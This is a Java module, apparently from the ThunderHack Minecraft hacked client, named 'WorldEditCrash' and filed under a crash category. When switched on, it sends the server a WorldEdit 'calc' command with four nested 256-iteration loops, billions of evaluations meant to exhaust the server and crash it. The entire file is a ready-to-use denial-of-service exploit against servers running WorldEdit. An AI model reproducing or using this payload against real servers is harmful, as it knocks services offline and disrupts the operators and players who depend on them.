package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;

public class WorldEditCrash extends Module {
    private boolean sent = false;

    public WorldEditCrash() {
        super("WorldEditCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        sent = true;

        mc.player.networkHandler.sendCommand("calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        sendMessage("Command sent");
    }

    @Override
    public void onDisable() {
        sent = false;
    }
}
